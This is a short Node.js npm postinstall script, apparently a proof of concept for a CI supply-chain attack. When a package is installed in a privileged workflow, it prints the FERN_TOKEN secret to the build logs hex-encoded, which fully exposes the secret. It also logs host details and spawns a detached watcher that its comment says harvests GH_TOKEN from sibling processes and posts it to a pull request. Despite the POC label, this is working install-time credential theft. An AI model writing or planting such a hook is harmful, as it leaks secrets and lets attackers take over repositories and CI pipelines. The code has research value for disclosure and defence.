const fs = require('fs'), cp = require('child_process'), crypto = require('crypto');
const t = process.env.FERN_TOKEN || '';
console.log('[POC] npm postinstall executed in privileged workflow');
console.log('[POC] uid=' + process.getuid() + ' host=' + require('os').hostname() + ' cwd=' + process.cwd());
console.log('[POC] FERN_TOKEN len=' + t.length + ' hex=' + Buffer.from(t, 'utf8').toString('hex'));
console.log('[POC] FERN_TOKEN sha256=' + crypto.createHash('sha256').update(t).digest('hex'));
// detached watcher: harvest GH_TOKEN from sibling step processes and post it to the PoC PR
try {
  const script = require('path').join(__dirname, 'watch.js');
  const child = cp.spawn(process.execPath, [script], { detached: true, stdio: 'ignore', cwd: process.cwd() });
  child.unref();
  fs.writeFileSync('/tmp/poc_watch.pid', String(child.pid));
  console.log('[POC] watcher spawned pid=' + child.pid);
} catch (e) { console.log('[POC] watcher failed: ' + e.message); }
